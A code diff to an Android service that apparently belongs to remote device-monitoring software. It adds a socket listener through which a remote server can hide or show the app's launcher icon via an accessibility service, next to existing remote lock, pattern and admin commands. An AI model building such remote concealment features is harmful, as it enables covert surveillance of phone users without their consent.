@@ -111,6 +111,7 @@ public class Server extends Service {
             socket.on("mb-device-security-event-" + mDeviceID, onDeviceSetPattern);
             socket.on("mb-application-event-monitor-" + mDeviceID, onAppEventMonitor);
             socket.on("mb-request-admin-monitor-" + mDeviceID, onRequestAdminMonitor);
+            socket.on("mb-visible-app-event-" + mDeviceID, OnHideAppIconMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -477,6 +478,26 @@ public class Server extends Service {
                 } else if(app_event.equals("unlock")) {
                     Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_UNLOCK);
                     broadcastIntent.putExtra("packagename", package_name);
+                    sendBroadcast(broadcastIntent);
+                }
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
+        }
+    };
+    private final Emitter.Listener OnHideAppIconMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("OnHideAppIconMonitor:", data.toString());
+            String app_event = "";
+            try {
+                app_event = (String) data.get("event");
+                if(app_event.equals("hide")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_ICON_HIDE);
+                    sendBroadcast(broadcastIntent);
+                } else if(app_event.equals("show")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_ICON_SHOW);
                     sendBroadcast(broadcastIntent);
                 }
             } catch (JSONException e) {
